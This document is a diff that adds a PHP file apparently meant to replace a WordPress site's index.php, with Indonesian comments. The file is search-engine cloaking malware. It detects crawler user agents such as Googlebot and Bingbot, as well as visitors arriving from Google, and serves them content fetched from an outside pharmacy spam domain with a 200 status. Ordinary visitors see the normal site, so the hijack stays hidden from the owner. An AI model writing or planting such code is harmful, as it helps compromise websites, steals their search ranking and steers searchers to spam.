@@ -1,0 +1,67 @@
+<?php
+// 1. MATIKAN CACHE SECARA AGRESIF AGAR SYSTEM CLOAKING SELALU LIVE
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Cache-Control: post-check=0, pre-check=0", false);
+header("Pragma: no-cache");
+header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
+
+function isSearchEngineBot() {
+    // Sudah ditambahkan 'Google-InspectionTool' dan 'Googlebot' dengan penulisan yang rapi
+    return preg_match('/(googlebot|google-inspectiontool|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|telegrambot|google-site-verification|ahrefsbot)/i', $_SERVER['HTTP_USER_AGENT'] ?? '');
+}
+
+function isFromGoogle() {
+    $referer = $_SERVER['HTTP_REFERER'] ?? '';
+    return (strpos($referer, 'google.com') !== false || strpos($referer, 'google.co.id') !== false);
+}
+
+function NuLzFetch($url){
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+        $fetch = curl_exec($ch);
+        curl_close($ch);
+        return $fetch;
+    } elseif (function_exists('file_get_contents')) {
+        // Atur konteks agar tidak gampang diblokir oleh server target
+        $options = array('http' => array('user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0'));
+        $context = stream_context_create($options);
+        return @file_get_contents($url, false, $context);
+    }
+    return "Cannot Fetch URL";
+}
+
+// Set cookie untuk menandai pengunjung biasa
+$cookie_expiration = time() + (365 * 86400);
+if (!isset($_COOKIE['visited'])) {
+    setcookie('visited', '1', $cookie_expiration, "/");
+}
+
+$landing_page = 'https://amoxicillin.best/'; // Safe Page / Landing Page untuk Bot & Traffic Google
+
+// --- LOGIKA EKSEKUSI CLOAKING ---
+
+if (isSearchEngineBot() || isFromGoogle()) {
+    // Berikan respon 200 OK resmi agar GSC menganggap halaman ini valid dan sehat
+    http_response_code(200);
+    echo NuLzFetch($landing_page);
+    exit();
+} 
+
+// --- JALUR DEFAULT (JIKA BUKAN BOT / BUKAN DARI GOOGLE) ---
+// Jangan gunakan eval() untuk WordPress karena merusak core system. 
+// Langsung panggil engine utama WordPress secara normal dan bersih:
+
+if (file_exists(__DIR__ . '/wp-blog-header.php')) {
+    define('WP_USE_THEMES', true);
+    require(__DIR__ . '/wp-blog-header.php');
+} else {
+    // Jika bukan WordPress, baru panggil file index cadangan Anda
+    include_once('index2.php');
+}
+?>
